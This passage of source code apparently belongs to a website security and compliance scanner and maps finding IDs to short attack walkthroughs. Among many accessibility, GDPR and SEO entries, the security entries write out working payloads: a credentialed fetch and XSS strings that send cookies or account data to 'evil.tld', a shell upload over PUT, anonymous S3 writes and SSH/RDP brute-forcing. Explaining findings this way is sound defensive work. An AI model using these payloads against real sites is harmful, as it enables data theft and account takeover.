    'If `.git` is exposed: `git-dumper https://target/.git ./repo` → `git log -p` to recover secrets from history.',
  ],
  'sourcemaps': [
    'Any visitor opens DevTools → Sources, or `curl https://target/app.js.map`.',
    'Recovered original source exposes internal endpoints, feature flags, and auth logic.',
    'Attack the now-known internal/admin endpoints directly (they are often less hardened than the public UI).',
  ],
  'insecure-form': [
    'On-path attacker sniffs the plain-HTTP form POST: `tcpdump -A port 80`.',
    'Read username/password/email straight out of the request body.',
    'Optionally modify the POST or redirect the form action to an attacker host.',
  ],
  'cors-wildcard-credentials': [
    'Host any page (or use an XSS on any site) the logged-in victim loads.',
    'Run: `fetch("https://target/api/me",{credentials:"include"}).then(r=>r.text()).then(t=>fetch("https://evil.tld/?d="+encodeURIComponent(t)))`.',
    'Because ACAO reflects/allow-* with credentials, the authenticated JSON is readable cross-origin → full account data exfil.',
  ],
  'cors-wildcard': [
    'Any site the victim (or an anonymous visitor) loads can read public responses.',
    '`fetch("https://target/api/...").then(r=>r.json())` — no credentials needed.',
    'Chain with any endpoint that leaks more than intended (IDs, internal data).',
  ],
  'disclosure': [
    'Read the version banner (`Server:`, `X-Powered-By:`).',
    '`searchsploit <product> <version>` for a matching public exploit.',
    'Fire the corresponding PoC against the target.',
  ],
  'dir-listing': [
    'Browse the autoindex pages (`/uploads/`, `/backup/`).',
    'Download anything sensitive: DB dumps, `.env`, source archives.',
    'Use recovered creds/paths to move to the next stage.',
  ],
  'http-methods': [
    'Probe: `curl -X OPTIONS -i https://target/`, `nmap --script http-methods target`.',
    'If `PUT`/WebDAV is open: `curl -T shell.jsp https://target/uploads/` then request the uploaded file.',
    'If `TRACE` is open, use it for XST/cookie theft in legacy setups.',
  ],
  'open-redirect': [
    'Build a link to the trusted domain that redirects out, e.g. `https://target/login?next=https://evil.tld`.',
    'Send it to victims — the visible host is the trusted domain, the landing page is the attacker\'s.',
    'Harvest credentials on the convincing phishing clone, or steal OAuth/SSO tokens as they pass through the redirect.',
  ],
  'reflected-input': [
    'Find a param echoed back unescaped: `https://target/search?q=<marker>`.',
    'Escalate the marker to a real payload: `?q=<svg/onload=fetch("https://evil.tld/"+document.cookie)>`.',
    'Deliver the crafted link to victims (or store it where it will be viewed) — payload runs in the site origin.',
  ],
  'host-header': [
    'Send a request with an attacker-controlled Host: `curl -H "Host: evil.tld" https://target/`.',
    'If it is reflected into password-reset links or caches, follow that vector.',
    'Poison the reset link → victim clicks it → token lands on attacker host → account takeover.',
  ],
  'graphql-introspection': [
    'Dump the schema: `curl -X POST https://target/graphql -d \'{"query":"{__schema{types{name fields{name}}}}"}\'`.',
    'Enumerate all queries/mutations, including internal/admin-only fields.',
    'Call sensitive mutations directly (bypassing the UI) with the victim\'s or your own token.',
  ],
  'api-error-verbose': [
    'Trigger errors with malformed input: `curl "https://target/api/x?id=\'"`.',
    'Read stack traces for framework versions, file paths, and DB queries.',
    'Use the leaked details to craft SQLi/RCE payloads or locate source files.',
  ],
  'bucket-public': [
    'Take the bucket name from the page and list it anonymously: `aws s3 ls s3://bucket --no-sign-request`.',
    'Download/sync everything: `aws s3 sync s3://bucket ./loot --no-sign-request`.',
    'Write if allowed: `aws s3 cp shell.html s3://bucket/ --no-sign-request` → defacement/host malware.',
  ],
  'exposed-path': [
    'Request the exposed file directly: `curl -i https://target/.env`, `/wp-config.php.bak`, `/server-status`.',
    'Parse out credentials/keys from the response.',
    'Use them against the DB, cloud, or admin panel as in `secret-leak`.',
  ],
  'hsts-weak-maxage': [
    'On-path attacker waits for the HSTS entry to expire (short max-age).',
    'Re-downgrade the next request to http:// and strip TLS again.',
    'Repeat the sslstrip login capture until the header is fixed to a long max-age.',
  ],
  'hsts-no-preload': [
    'First-visit downgrade: the very first HTTP request has no HSTS yet to upgrade it.',
    'SSL-strip that first request before the browser ever sees the HSTS header.',
    'Preload is the only defence for that first hop.',
  ],
  'hdr-cross-origin-opener-policy': [
    'Open the target in a popup/window from an attacker page.',
    'With no COOP the attacker keeps a `window.opener` reference to the target.',
    'Read/mutate the target\'s window (Spectre-class side channels, or navigate it to a phishing clone).',
  ],
  'hdr-cross-origin-embedder-policy': [
    'Embed the target as a cross-origin iframe/resource.',
    'Without COEP the page can load un-credentialed cross-origin resources unsafely.',
    'Enables cross-origin timing side channels and reduces process isolation.',
  ],
  'hdr-cross-origin-resource-policy': [
    'Hotlink/embed the target\'s resources from an attacker page.',
    'Without CORP, responses can be pulled into cross-origin contexts.',
    'Use it for data exfil via side channels or resource-based attacks.',
  ],
  'csp-no-default-src': [
    'There is no default-src fallback, so unspecified fetch directives are unrestricted.',
    'Inject `<script src="https://evil.tld/x.js">` via any injection point.',
    'Script runs in-origin and exfiltrates cookies/data.',
  ],
  'csp-no-base-uri': [
    'Find any HTML injection point (even a partial one).',
    'Inject `<base href="https://evil.tld/">` to hijack all relative URLs.',
    'Subsequent relative scripts/images now load from the attacker host.',
  ],
  'csp-no-frame-ancestors': [
    'Embed the target in an invisible iframe on an attacker page.',
    'Overlay fake UI (clickjacking): `<iframe src="https://target/account" style="opacity:0">` over a decoy button.',
    'Victim clicks what they think is the decoy — they actually click the target (delete account, confirm transfer).',
  ],
  'csp-no-object-src': [
    'Inject `<object data="https://evil.tld/plugin.swf"></object>` or a legacy plugin.',
    'The plugin context can bypass script-src restrictions.',
    'Run script or read data from within the plugin.',
  ],
  'csp-no-trusted-types': [
    'Find a DOM-XSS sink (`innerHTML`, `eval`, `document.write`).',
    'Without Trusted Types, a plain string reaches the sink unfiltered.',
    'Same-XSS impact: run in-origin script, steal session.',
  ],
  'csp-no-upgrade-insecure': [
    'On-path attacker intercepts http:// subresource requests that are not auto-upgraded.',
    'Swap the resource for a malicious one.',
    'Payload runs in-origin (mixed-content style).',
  ],
  'csp-http-source': [
    'The CSP allows http:// origins in a directive.',
    'Intercept that cleartext resource request on-path.',
    'Serve a malicious script/iframe from the allowed http origin.',
  ],
  'no-cache': [
    'Shared cache / proxy stores the authenticated response.',
    'Later, an unauthenticated request retrieves the cached private page.',
    'Read another user\'s data from the cache (cache poisoning / leak).',
  ],
  'http-redirect': [
    'Follow the redirect chain manually: `curl -IL https://target`.',
    'Look for a hop that crosses to http:// or an attacker-controlled host.',
    'Downgrade/inject at that hop.',
  ],
  'inline-scripts': [
    'Find an injection point that lands inside an existing inline script block.',
    'Break out with `</script><script>fetch("https://evil.tld/"+document.cookie)</script>`.',
    'Inline execution means no external URL to block — CSP hash/nonce is the only fix.',
  ],
  'no-compression': [
    'Larger responses transfer more slowly, widening the on-path window.',
    'On a hostile network, more data/time to capture and tamper with.',
    'Performance-only: no direct exploit, but it feeds other on-path attacks.',
  ],
  'no-security-txt': [
    'You cannot find a security contact to report a bug you found.',
    'An attacker is not incentivised to disclose, so they weaponise it first.',
    'No coordinated-disclosure channel → longer exposure window.',
  ],
  'deprecated': [
    'The page uses a deprecated platform feature an attacker knows is unpatched.',
    'Consult the deprecation\'s known CVE/behaviour change.',
    'Exploit the documented weakness the feature now carries.',
  ],
  'deprecated-document-domain': [
    'Cross-origin iframe sets `document.domain` to relax the same-origin policy.',
    'Now a sibling subdomain (or attacker-controlled page on one) can read it.',
    'Read cross-subdomain data / run script in the relaxed origin.',
  ],
  'dns-spf': [
    'Register a lookalike envelope sender with any SMTP provider.',
    'Send mail with `MAIL FROM:` spoofed to @yourdomain — no SPF to reject it.',
    'Land convincing phishing in customer inboxes.',
  ],
  'dns-dmarc': [
    'Spoof the domain with no DMARC policy to stop it.',
    'Send CEO-fraud / invoice-fraud mail that receivers have no rule to reject.',
    'Wire the money before anyone verifies.',
  ],
  'dns-dnssec': [
    'Intercept DNS resolution on-path (public Wi-Fi, rogue resolver).',
    'Answer with an attacker IP for the target domain — no DNSSEC signature to reject it.',
    'Serve a full MITM clone at the attacker IP.',
  ],
  'dns-caa': [
    'Trick (or compromise) any CA into issuing a cert for the domain.',
    'No CAA record restricts which CA may issue.',
    'Use the valid cert to impersonate the site with a trusted padlock.',
  ],
  'dns-mta-sts': [
    'Strip/downgrade STARTTLS on the MX path (SMTP MITM).',
    'Read mail in the clear, including password resets and 2FA codes.',
    'MTA-STS is the only thing that forces TLS on inbound mail.',
  ],
  'dns-tls-rpt': [
    'The downgrade above happens without anyone being told.',
    'No TLS-RPT means no report is generated.',
    'The SMTP interception continues silently.',
  ],
  'server-version-leak': [
    'Attacker parses HTTP headers to retrieve exact software banner.',
    'Queries public CVE databases (NVD, Exploit-DB) for matching vulnerabilities.',
    'Executes targeted exploits without needing blind discovery.',
  ],
  'vuln-php-eol': [
    'Attacker identifies exposed End-of-Life PHP banner.',
    'Targets unpatched CGI argument injection (CVE-2024-4577) or multipart parser buffer flaws.',
    'Executes arbitrary shell commands with web server privileges.',
    'Establishes persistence via webshell and extracts database credentials.',
  ],
  'vuln-php-81-eol': [
    'Attacker scans for PHP 8.1 specific vulnerabilities and memory safety gaps.',
    'Leverages unpatched upstream bugs to trigger denial of service or code injection.',
  ],
  'vuln-apache-outdated': [
    'Attacker sends encoded characters or UNC paths through mod_rewrite / mod_proxy.',
    'Bypasses authentication or triggers internal SSRF (CVE-2024-38472 / CVE-2024-38475).',
    'Escapes proxy context to execute scripts or access protected administrative backends.',
  ],
  'vuln-nodejs-eol': [
    'Attacker crafts pipeline HTTP requests with conflicting Content-Length / Transfer-Encoding.',
    'Triggers HTTP request smuggling or permission model bypasses in unpatched Node.js core.',
    'Poisons intermediate caches and hijacks other user sessions.',
  ],
  'vuln-nginx-outdated': [
    'Attacker sends crafted HTTP/2 or HTTP/3 frames to trigger worker process crashes.',
    'Maintains denial of service against web server worker processes.',
  ],
  'vuln-jquery-outdated': [
    'Attacker submits payload containing malicious HTML elements (e.g. <style><img src=x onerror=...>).',
    'Bypasses old htmlPrefilter regex sanitization in jQuery < 3.5.0.',
    'Executes arbitrary JavaScript in victim browser sessions.',
  ],
  'vuln-angularjs-eol': [
    'Attacker inputs client-side template expressions into page inputs.',
    'Escapes AngularJS sandbox to execute arbitrary JS in user browser context.',
    'Steals user credentials and session tokens.',
  ],
  'vuln-polyfill-malicious': [
    'Attacker / rogue CDN inspects incoming HTTP request headers.',
    'Identifies eligible client devices (e.g. mobile Safari / Chrome).',
    'Injects obfuscated redirect or malicious payload leading to phishing or fraud.',
  ],
  'vuln-wordpress-outdated': [
    'Attacker scans publicly readable generator meta tag or asset versions.',
    'Identifies vulnerable WordPress core version.',
    'Sends public exploit payload to trigger privilege escalation or media SSRF.',
    'Establishes persistence via malicious plugin installation.',
  ],
  'vuln-nextjs-ssrf': [
    'Attacker submits Server Action POST request with spoofed Host header.',
    'Next.js server follows internal redirect based on unvalidated Host header.',
    'Extracts internal microservice data or cloud metadata credentials.',
  ],
  'vuln-lodash-outdated': [
    'Attacker sends JSON payload with __proto__ properties to API or form.',
    'Outdated Lodash utility merges properties into global Object prototype.',
    'Alters application control flow or triggers remote code execution.',
  ],
  'vuln-bootstrap-outdated': [
    'Attacker crafts payload containing malicious data-attribute (e.g. data-template).',
    'Outdated Bootstrap component renders attribute directly to DOM without escaping.',
    'Executes arbitrary JavaScript in victim browser context.',
  ],
  'vuln-moment-redos': [
    'Attacker sends crafted date string with repetitive pattern.',
    'Vulnerable regex in Moment.js triggers exponential backtracking.',
    'Server or browser CPU spikes to 100%, causing denial of service.',
  ],
  'vuln-axios-outdated': [
    'Attacker sets up redirect endpoint on external domain.',
    'Triggers application request using Axios to redirect target.',
    'Outdated Axios leaks original Authorization header to attacker domain.',
  ],
  'trackers': [
    'N/A to an external attacker — this is a data-sharing/privacy exposure.',
    'The named third parties receive user identifiers as users browse.',
    'Combine with no-consent: regulators can fine you and users can claim damages (GDPR Art. 82).',
  ],
  'no-consent': [
    'Cookies/trackers fire before any consent banner is answered.',
    'Regulator (or a claimant) shows pre-consent identifiers reached ad-tech.',
    'GDPR fines up to 4% of turnover + individual compensation claims.',
  ],
  'consent-present': [
    'N/A — a control is present. Verify it is not a dark pattern.',
    'Check that "Reject all" is as easy as "Accept all" (EDPB requirement).',
    'Unequal buttons are themselves a compliance violation.',
  ],
  'policy-': [
    'Verify the legal pages exist and are reachable without a login.',
    'Missing privacy/cookie policy = no lawful basis documented.',
    'Regulators treat the absence as an aggravating factor in any complaint.',
  ],
  'data-residency': [
    'N/A to an attacker — a transfer-law exposure.',
    'User data flows to non-EU processors/hosts.',
    'Without SCCs/DPF the transfer is unlawful (Schrems II).',
  ],
  'hdr-': [
    'The named security response header is absent.',
    'Replay the matching attack from the `hdr-*` walkthrough relevant to it.',
    'Missing headers are additive risk — each removes one browser-side defence.',
  ],
  'hdr-deprecated-': [
    'The legacy header is still set (`X-XSS-Protection`, `Expect-CT`, ...).',
    'It implies an old stack; scan the version banners for matching CVEs.',
    'Exploit the outdated component it reveals.',
  ],
  'a11y-alt': [
    'N/A to an attacker — accessibility/quality gap.',
    'Screen-reader users cannot perceive images without alt text.',
    'Fails WCAG 2.2 AA → EAA/EU accessibility exposure and exclusion of users.',
  ],
  'tech-detected': [
    'Fingerprint the exact stack from the page (versions, build IDs).',
    '`searchsploit <product> <version>` for a matching CVE, and check the vendor changelog.',
    'Fire the public PoC against the identified version.',
  ],
  'page-weight': [
    'N/A to an attacker directly — cost/performance exposure.',
    'Heavy pages drain mobile data and increase bounce/timeout.',
    'On slow networks they widen the on-path window for other attacks.',
  ],
  'img-format': [
    'N/A to an attacker — asset-hygiene issue.',
    'Legacy formats (PNG/JPEG where AVIF/WebP fits) inflate transfer size.',
    'Slower LCP and higher bandwidth cost.',
  ],
  'render-blocking': [
    'N/A to an attacker — performance issue.',
    'Blocking CSS/JS delays first paint and interactivity.',
    'Higher INP/LCP → measurable conversion loss.',
  ],
  'broken-link': [
    'Crawlers and users hit dead ends (`404`/`5xx`).',
    'Search engines waste crawl budget and drop rankings.',
    'Some broken links may leak removed pages/paths to anyone probing.',
  ],
  'seo-sitemap': [
    'No sitemap means crawlers discover pages slowly/incompletely.',
    'Rival/low-quality pages can outrank you on your own topics.',
    'Weak discoverability also hides pages from AI crawlers you may want.',
  ],
  'seo-robots': [
    'Missing / unreadable robots.txt removes crawler guidance.',
    'Crawlers guess, and can index or ignore pages unpredictably.',
    'Attackers can also read a missing policy as an unmanaged surface.',
  ],
  'seo-robots-block': [
    'robots.txt blocks pages you likely want indexed.',
    'Search visibility drops for those URLs.',
    'Note: robots.txt is not a security control — blocked paths are still publicly reachable.',
  ],

  /* ------------------------------------------------------------------ *
   * Exploit walkthroughs for the families that previously fell through
   * to GENERIC_EXPLOIT. Non-attack (accessibility / SEO / performance /
   * compliance) entries say so explicitly, as the plan requires, instead
   * of the misleading "reproduce it manually" generic steps.
   * ------------------------------------------------------------------ */

  /* ---- accessibility: no attacker, real user impact ---- */
  'a11y-alt': [
    'N/A to an attacker — this excludes screen-reader users.',
    'Load the page with a screen reader (NVDA/VoiceOver).',
    'Listen to how the image is announced: "image" with no description.',
    'The user cannot identify the content, so they abandon the page.',
  ],
  'a11y-alt-rendered': [
    'N/A to an attacker — assistive-tech users are excluded.',
    'Open the URL and let JavaScript finish rendering.',
    'Run the injected images through a screen reader.',
    'Injected images announce with no text alternative, unlike the static ones.',
  ],
  'a11y-autocomplete': [
    'N/A to an attacker — users with motor/cognitive disabilities are slowed down.',
    'Tab to a personal-data field (name, email, address).',
    'Observe that the browser offers no autofill suggestion.',
    'The user must hand-type every value, increasing errors and abandonment.',
  ],
  'a11y-autoplay': [
    'N/A to an attacker — it hijacks the user audio channel.',
    'Load the page with sound on.',
    'Media starts playing with no visible pause or stop control.',
    'Screen-reader output is drowned out; the user cannot stop it.',
  ],
  'a11y-button-semantics': [
    'N/A to an attacker — keyboard users cannot activate the control.',
    'Tab to a link that acts as a button.',
    'Press Enter — nothing happens (there is no href).',
    'The action is unreachable without a mouse.',
  ],
  'a11y-contrast': [
    'N/A to an attacker — low-vision users cannot read the text.',
    'Sample the failing text/background pair.',
    'Compute the ratio (DevTools or a contrast checker) — it is below 4.5:1.',
    'The text is unreadable in bright light or with colour-vision deficiency.',
  ],
  'a11y-focus-visible': [
    'N/A to an attacker — keyboard users lose their position.',
    'Press Tab repeatedly through the page.',
    'Observe that no focus ring appears on controls.',
    'The user cannot tell which control will activate, so navigation stalls.',
  ],
  'a11y-h1': [
    'N/A to an attacker — the document outline is ambiguous.',
    'Open the page with a screen reader and list the headings.',
    'No level-1 heading is announced.',
    'The page topic is unclear to non-visual users and to crawlers.',
  ],
  'a11y-h1-multi': [
    'N/A to an attacker — the heading outline is flattened.',
    'List all headings on the page.',
    'More than one <h1> is returned.',
    'Screen-reader navigation cannot tell which heading is the page topic.',
  ],
  'a11y-heading-order': [
    'N/A to an attacker — non-visual navigation breaks.',
    'Walk the heading list and note a jump such as h2 to h4.',
    'Jump to headings; the skipped level is never announced.',
    'Sections nested under the gap become unreachable by heading jump.',
  ],
  'a11y-label': [
    'N/A to an attacker — screen-reader and voice users are blocked.',
    'Tab to a form control with the screen reader running.',
    'It announces "edit" or "button" with no name.',
    'The user cannot tell what to enter, so checkout/signup stalls.',
  ],
  'a11y-landmark': [
    'N/A to an attacker — assistive tech cannot skip to the content.',
    'Load the page with a screen reader and list landmarks.',
    'No <main> landmark is present.',
    'The user must tab through the entire navigation on every page.',
  ],
  'a11y-lang': [
    'N/A to an attacker — screen readers guess the language.',
    'Open the page with a screen reader.',
    'It reads the content in the default/OS language, not the page language.',
    'Pronunciation is wrong and the content is hard to understand.',
  ],
  'a11y-link-text': [
    'N/A to an attacker — link purpose is lost.',
    'List all links on the page with a screen reader.',
    'Several read identically as "click here" or "read more".',
    'Out of context the user cannot tell where any link leads.',
  ],
  'a11y-live-region': [
    'N/A to an attacker — dynamic updates are silent.',
    'Trigger a UI update (add to cart, submit with an error).',
    'The screen reader announces nothing.',
    'The user believes the app is frozen and retries or leaves.',
  ],
  'a11y-reduced-motion': [
    'N/A to an attacker — motion-sensitive users are affected.',
    'Enable "reduce motion" in the OS/browser.',
    'Reload the page — animations still play unchanged.',
    'Vestibular symptoms and nausea can follow; the user leaves.',
  ],
  'a11y-skip-link': [
    'N/A to an attacker — keyboard users pay the navigation cost.',
    'Press Tab once on page load.',
    'No "skip to content" link appears first.',
    'The user must tab through every nav item on every page.',
  ],
  'a11y-statement': [
    'N/A to an attacker — a compliance/transparency gap.',
    'Look for an accessibility statement link in the footer.',
    'None is present.',
    'Users cannot report barriers or see your conformance target.',
  ],
  'a11y-table-headers': [
    'N/A to an attacker — tabular data is unusable non-visually.',
    'Navigate a data table with a screen reader.',
    'Cells are announced with no column header.',
    'The user hears a stream of numbers with no meaning.',
  ],
  'a11y-title': [
    'N/A to an attacker — page orientation is lost.',
    'Check the browser tab and the screen reader announcement.',
    'No meaningful page name is shown.',
    'Users cannot distinguish this tab from others open to the same site.',
  ],
  'a11y-zoom': [
    'N/A to an attacker — low-vision users cannot magnify.',
    'Try to pinch-zoom on a phone.',
    'The viewport meta blocks scaling.',
    'The user is stuck with text they cannot enlarge.',
  ],

  /* ---- EU / GDPR compliance ---- */
  'eu-no-cmp': [
    'Visit the site with a clean profile and the network tab open.',
    'Observe non-essential cookies/identifiers being set before any choice.',
    'No consent mechanism blocks them (no prior, informed consent).',
    'A regulator (or any user) can demonstrate unlawful pre-consent processing with a HAR file.',
  ],
  'eu-consent-mode-default': [
    'Inspect the consent-default call before any tag fires.',
    'Observe analytics_storage/ad_storage are not set to "denied".',
    'Tags fire and write identifiers while the user has not opted in.',
    'The default state itself is the breach.',
  ],
  'eu-pre-consent-firing': [
    'Load the site with a clean profile and capture the network log.',
    'Match the tracker requests against the timestamp of consent.',
    'Requests appear before any consent action.',
    'Proves an ePrivacy Art. 5(3) violation with a single HAR export.',
  ],
  'eu-third-party-cookie': [
    'Load the site and list Set-Cookie domains.',
    'Note cookies set on a registrable domain you do not own.',
    'The third party receives identifiers from your visitors.',
    'An undocumented third-country transfer under GDPR Art. 44.',
  ],
  'eu-ai-act-disclosure': [
    'Interact with the AI feature as a normal user.',
    'No notice states that the counterpart is an AI system.',
    'Generated media carries no machine-readable marking.',
    'An EU AI Act Art. 50 transparency failure.',
  ],
  'eu-dsa-trader-info': [
    'Open the online-sales page.',
    'Check for trader name, address and contact details.',
    'The required DSA trader information is missing.',
    'A DSA authority can restrict trading for non-compliance.',
  ],
  'eu-data-transfer': [
    'Fingerprint the third-party infrastructure from the page.',
    'Identify the sub-processor and its region.',
    'No DPA / SCC chain is documented for the transfer.',
    'A GDPR Chapter V breach and a reportable incident.',
  ],
  'eu-cookie-no-reject-button': [
    'Visit the site with no existing cookies stored.',
    'Observe the cookie consent banner displays an "Accept" button, but no immediate "Reject" button.',
    'Rejecting cookies requires navigating into settings or submenus, violating EDPB equal-prominence standards.',
    'Forms grounds for regulatory action and consumer protection fines.',
  ],
  'eu-preticked-consent': [
    'Inspect forms on the page containing consent or newsletter checkboxes.',
    'Observe that the checkbox element has the "checked" attribute pre-selected by default.',
    'Under CJEU Planet49 and GDPR Art. 4(11), silence or pre-ticked boxes do not constitute active consent.',
    'Regulators treat any collected emails or data as unlawfully processed.',
  ],
  'us-gpc-optout': [
    'Send an HTTP request with the "Sec-GPC: 1" header or inspect footer links.',
    'Observe the page loads marketing/advertising trackers without providing "Your Privacy Choices" or honoring GPC.',
    'Fails CCPA/CPRA, TDPSA, and Colorado/Connecticut opt-out mandate.',
    'Triggers state AG investigation and civil liability.',
  ],
  'privacy-session-replay': [
    'Inspect page network requests and scripts for session replay tools (Hotjar, FullStory, Clarity, Smartlook).',
    'Observe the script initializing and recording DOM events immediately on page load prior to consent.',
    'No conspicuous wiretapping disclosure or prior affirmative consent is provided.',
    'Forms the evidentiary basis for class-action lawsuits under CIPA § 631.',
  ],

  /* ---- active / probe findings ---- */
  'crossdomain-policy': [
    'Fetch /crossdomain.xml and /clientaccesspolicy.xml.',
    'Observe a wildcard or permissive allow-domain list.',
    'Any site the victim visits can read authenticated responses (Flash-era).',
    'Delete the files — they are pure surface with no modern benefit.',
  ],
  'bucket-referenced': [
    'No exploit — this is the correct configuration (no anonymous listing).',
    'Confirm the bucket still refuses anonymous ListBucket.',
    'Keep public-access-block on and rotate app credentials.',
    'Informational finding; no attacker action available.',
  ],
  'ws-insecure': [
    'Join the same network as a victim (public Wi-Fi, rogue AP, ARP spoof).',
    'Sniff the ws:// stream with `wireshark` / `tcpdump`.',
    'Read tokens and messages, or inject frames into the socket.',
    'Session takeover and full control of the realtime channel.',
  ],
  'ws-endpoints': [
    'Discover the socket endpoint from the page bundle.',
    'Connect and enumerate channels/messages.',
    'Probe whether authorization is checked per-message or only at connect.',
    'Missing per-object checks let you read other users channels.',
  ],
  'sri-missing': [
    'Identify the third-party script URL without an integrity attribute.',
    'Compromise the CDN, its DNS, or publish a malicious version.',
    'The browser executes it as same-origin code on every page load.',
    'Full DOM, cookie and network access in your origin — supply-chain XSS.',
  ],
  'third-party-surface': [
    'List every external script host the page loads.',
    'For each: check availability, region and data it receives.',
    'A dead or breached host degrades or compromises the page.',
    'Reduce the surface by self-hosting and removing non-essential tags.',
  ],
  'pii-exposure': [
    'View the page source or download the JS bundle.',
    'Grep for IBAN/card-shaped numbers.',
    'Personal and financial data is readable by anyone.',
    'GDPR Art. 33/34 breach — mandatory notification plus fraud risk.',
  ],
  'pii-iban': [
    'Download the HTML/JS bundle and extract IBAN-shaped values.',
    'Pair an IBAN with a name found nearby.',
    'Attempt a SEPA direct-debit mandate with those details.',
    'Payment fraud and a GDPR Art. 34 breach-notification event.',
  ],
  'public-company-trr': [
    'View the public company bank account in footer / payment terms.',
    'Use for legitimate wire transfer or invoice settlement.',
    'No security vulnerability — corporate TRR publication is standard EU practice.',
  ],

  /* ---- Shodan InternetDB findings ---- */
  'shodan-exposed-db': [
    'Scan the host IP with nmap or Shodan to identify the open database port.',
    'Attempt direct unauthenticated connection or brute-force database credentials.',
    'Execute administrative commands or queries to dump customer data and tables.',
    'Wipe or encrypt the database and leave a ransom note.',
  ],
  'shodan-exposed-remote-mgmt': [
    'Locate the open management port (RDP 3389, VNC 5900, Telnet 23) via Shodan.',
    'Launch automated credential stuffing or password brute-force against administrative user accounts.',
    'Check for unpatched remote code execution vulnerabilities (e.g. BlueKeep) against the service.',
    'Establish an interactive remote desktop or shell session and pivot through internal infrastructure.',
  ],
  'shodan-known-cve': [
    'Query Shodan InternetDB for the target IP to retrieve indexed CVE identifiers.',
    'Cross-reference CVEs with public exploit repositories (Exploit-DB, GitHub POCs, Metasploit).',
    'Send exploit payloads matching the target software and version.',
    'Gain unauthorized code execution or extract sensitive server memory.',
  ],
  'shodan-ssh-open': [
    'Connect to port 22 to banner-grab the SSH software version.',
    'Run automated password dictionary attacks against common usernames (root, admin, deploy).',
    'Test for CVEs matching specific OpenSSH release versions.',
    'Gain shell access if password authentication is permitted or credentials are compromised.',
  ],

  /* ---- Google CrUX field data findings ---- */
  'crux-field-fast': [
    'No exploit — this is a positive real-user performance assessment.',
    'Google CrUX 28-day field data confirms real mobile Chrome users experience fast loading and smooth interactivity.',
    'Continue monitoring Core Web Vitals in Google Search Console to prevent regressions.',
    'Maintain performance budgets for JavaScript bundles and media assets.',
  ],
  'crux-field-slow': [
    'Review Core Web Vitals metrics (LCP, INP, CLS) in Google PageSpeed Insights and Search Console.',
    'Identify render-blocking resources, unoptimized hero images, or heavy main-thread JavaScript execution.',
    'Refactor frontend assets, implement server-side caching, and optimize critical rendering paths.',
    'Measure improvements over the rolling 28-day CrUX measurement window.',
  ],

  /* ---- Certificate Transparency reconnaissance findings ---- */
  'ct-exposed-staging': [
    'Inspect public Certificate Transparency (CT) logs for SSL certificates issued for dev/staging subdomains.',
    'Test discovered subdomains for missing authentication, default credentials, or exposed debug bars.',
    'Extract sensitive environment configuration, test credentials, or internal API documentation.',
    'Leverage staging access to pivot toward production systems or databases.',
  ],

  /* ---- SEO: no attacker, discoverability/ranking impact ---- */
  'seo-title': [
    'N/A to an attacker — this is a search-visibility issue.',
    'Check the SERP snippet for the page.',
    'The title is absent, so the engine invents one.',
    'Lower, unpredictable click-through.',
  ],
  'seo-title-len': [
    'N/A to an attacker — a SERP truncation issue.',
    'Search for the page and read the result title.',
    'It is cut off or too thin.',
    'Weaker click-through and wasted keyword targeting.',
  ],
  'seo-desc': [
    'N/A to an attacker — snippet quality degrades.',
    'Search for the page.',
    'No meta description exists, so the snippet is scraped text.',
    'Less persuasive results and lower click-through.',
  ],
  'seo-desc-len': [
    'N/A to an attacker — snippet truncation.',
    'Search for the page and read the description.',
    'The call to action is cut off.',
    'Weaker click-through than a correctly sized description.',
  ],
  'seo-canonical': [
    'N/A to an attacker — duplicate-content dilution.',
    'List the URLs serving the same content.',
    'No canonical points at the preferred one.',
    'Ranking is split across duplicates.',
  ],
  'seo-viewport': [
    'N/A to an attacker — mobile rendering breaks.',
    'Open the page on a phone.',
    'Text is tiny and the layout does not scale.',
    'Mobile usability failure and a mobile-first ranking penalty.',
  ],
  'seo-lang': [
    'N/A to an attacker — language signals are lost.',
    'Inspect the <html> element.',
    'No lang attribute is set.',
    'Wrong-locale indexing and an accessibility failure.',
  ],
  'seo-h1': [
    'N/A to an attacker — topical relevance weakens.',
    'List the page headings.',
    'No <h1> is present.',
    'No primary keyword signal for the page.',
  ],
  'seo-h1-multi': [
    'N/A to an attacker — topical focus is diluted.',
    'List the page headings.',
    'Multiple <h1> elements are present.',
    'Keyword intent is split and the topic is unclear.',
  ],
  'seo-og': [
    'N/A to an attacker — social previews degrade.',
    'Share the link in a chat or on social.',
    'It renders as a bare URL.',
    'Lower social click-through and unbranded previews.',
  ],
  'seo-jsonld': [
    'N/A to an attacker — rich results are unavailable.',
    'Validate the page against the Rich Results Test.',
    'No structured data is found.',
    'Fewer SERP features and lower visibility.',
  ],
  'seo-status': [
    'N/A to an attacker — a crawl/indexing problem.',
    'Request the canonical URL.',
    'It does not return HTTP 200.',
    'The page is dropped from the index.',
  ],
  'seo-structured-data': [
    'N/A to an attacker — rich-result eligibility is lost.',
    'Run the page through a structured-data validator.',
    'No JSON-LD is present.',
    'No entity or rich snippets in search.',
  ],
  'seo-structured-data-invalid': [
    'N/A to an attacker — the markup is ignored.',
    'Parse each JSON-LD block.',
    'One or more fail to parse.',
    'Crawlers silently discard the malformed block.',
  ],
  'seo-structured-data-incomplete': [
    'N/A to an attacker — the entity is ineligible.',
    'Validate a declared type against its required properties.',
    'Required properties are missing.',
    'The rich result never appears.',
  ],
  'seo-structured-data-base': [
    'N/A to an attacker — brand-entity signals are weak.',
    'Check for an Organization/WebSite entity.',
    'None is declared.',
    'Reduced knowledge-panel and sitelink eligibility.',
  ],
  'seo-llms-txt': [
    'N/A to an attacker — AI crawler guidance is missing.',
    'Request /llms.txt.',
    'It returns 404.',
    'AI assistants quote your content without the framing you want.',
  ],
  'seo-llms-txt-h1': [
    'N/A to an attacker — llms.txt structure guidance.',
    'Inspect /llms.txt for an H1 heading (# Project Name).',
    'No H1 heading found at the top.',
    'PageSpeed Insights and AI models cannot identify primary project entity.',
  ],
  'seo-llms-txt-links': [
    'N/A to an attacker — Markdown link format guidance.',
    'Inspect /llms.txt for Markdown links [Title](url).',
    'Links are formatted as raw URLs without Markdown link brackets.',
    'Google PageSpeed Insights Agentic Browsing check reports missing links.',
  ],
  'seo-ai-crawler-policy': [
    'N/A to an attacker — an AI-scraping policy gap.',
    'Read robots.txt for AI user-agents (GPTBot, ClaudeBot, Google-Extended).',
    'No AI policy is stated.',
    'Content is ingested with no opt-in/opt-out signal.',
  ],
  'seo-ai-content-scraped': [
    'N/A to an attacker — AI content reuse.',
    'Compare robots.txt against the list of known AI crawlers.',
    'The content is open to all of them.',
    'Content may train models or appear in AI answers with no attribution.',
  ],
  'seo-noindex': [
